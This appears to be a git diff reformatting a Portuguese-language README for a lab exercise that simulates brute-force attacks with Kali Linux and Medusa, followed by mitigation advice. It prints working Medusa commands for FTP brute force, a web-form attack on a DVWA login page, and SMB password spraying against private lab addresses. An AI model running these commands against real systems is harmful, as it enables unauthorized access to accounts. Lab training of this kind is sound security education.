@@ -27,21 +27,25 @@ O objetivo é simular ataques de força bruta utilizando **Kali Linux** e a ferr
 ---
 
 ## Cenários de Teste
-
-1. Ataque de Força Bruta em FTP
-```bash
-medusa -h 192.168.56.101 -u admin -P wordlist.txt -M ftp
-
 **Objetivo**: validar credenciais fracas no serviço FTP.
-
 **Resultado esperado:** acesso obtido com senha simples.
 
+1. Ataque de Força Bruta em FTP
+
+```bash
+medusa -h 192.168.56.101 -u admin -P wordlist.txt -M ftp
+```
+
 **2. Automação em Formulário Web (DVWA)**
+```bash
 medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http \
 -m FORM:/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed
+```
 
 **3. Password Spraying em SMB**
+```bash
 medusa -h 192.168.56.103 -U users.txt -P passwords.txt -M smbnt
+```
 
 **## Recomendações de Mitigação**
 - Uso de senhas fortes e políticas de complexidade.
